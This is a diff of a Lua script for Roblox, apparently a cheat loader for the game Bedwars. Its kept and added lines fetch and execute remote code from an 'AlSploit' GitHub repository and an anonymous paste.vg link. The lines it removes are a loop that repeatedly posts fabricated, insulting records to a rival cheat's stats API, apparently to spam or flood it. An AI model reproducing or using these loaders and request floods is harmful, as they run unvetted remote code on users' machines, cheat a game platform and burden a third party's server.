@@ -241,47 +241,4 @@ task.spawn(function()
 end)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/main/AlSploit/Bedwars/Executed"))()
-
-repeat
-    task.wait(math.random(2, 4))
-    
-    local headers = {
-        ["Content-type"] = "application/json",
-        ["Authorization"] = "Bearer blankwontddosthis:3"
-    }
-    local data = {
-        ["client_id"] = tostring(game:GetService("HttpService"):GenerateGUID()), 
-        ["executor"] = "fuck off retard",
-        ['user_id'] = math.random(0, 10000000),
-        ['voidware_id'] = "github"
-    }
-    local final_data = game:GetService("HttpService"):JSONEncode(data)
-    local url = "https://api.vapevoidware.xyz/v".. "1".."/stats/data/add"
-    local a = request({
-        Url = url,
-        Method = 'POST',
-        Headers = headers,
-        Body = final_data
-    })
-    
-    task.wait(math.random(2, 4))
-    
-    local headers = {
-        ["Content-type"] = "application/json",
-        ["Authorization"] = "Bearer blankwontddosthis:3"
-    }
-    local data = {
-        ["client_id"] = tostring(game:GetService("HttpService"):GenerateGUID()), 
-        ["executor"] = "voidware sucks",
-        ['user_id'] = math.random(0, 10000000),
-        ['voidware_id'] = "github"
-    }
-    local final_data = game:GetService("HttpService"):JSONEncode(data)
-    local url = "https://api.vapevoidware.xyz/v".. "1".."/stats/data/add"
-    local a = request({
-        Url = url,
-        Method = 'POST',
-        Headers = headers,
-        Body = final_data
-    })
-until not game
+loadstring(game:HttpGet("https://paste.vg/raw/0rdyzqbkmm",true))() --stav implementation
